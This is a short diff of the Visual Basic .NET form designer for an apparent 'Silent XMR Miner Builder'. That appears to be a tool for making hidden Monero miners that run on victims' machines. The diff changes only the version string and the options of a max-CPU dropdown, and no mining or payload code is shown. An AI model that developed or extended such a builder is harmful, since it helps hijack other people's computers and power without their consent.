@@ -435,7 +435,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(802, 418)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent XMR Miner Builder 1.0.1"
+        Me.MephForm1.Text = "Silent XMR Miner Builder 1.0.2"
         '
         'MephTabcontrol2
         '
@@ -1267,12 +1267,12 @@ Partial Class Form1
         Me.txtMaxCPU.FormattingEnabled = True
         Me.txtMaxCPU.ItemHeight = 16
         Me.txtMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
-        Me.txtMaxCPU.Items.AddRange(New Object() {"10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
+        Me.txtMaxCPU.Items.AddRange(New Object() {"0%", "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
         Me.txtMaxCPU.Location = New System.Drawing.Point(495, 15)
         Me.txtMaxCPU.Margin = New System.Windows.Forms.Padding(4, 5, 4, 5)
         Me.txtMaxCPU.Name = "txtMaxCPU"
         Me.txtMaxCPU.Size = New System.Drawing.Size(88, 22)
-        Me.txtMaxCPU.StartIndex = 1
+        Me.txtMaxCPU.StartIndex = 2
         Me.txtMaxCPU.TabIndex = 26
         '
         'Label3
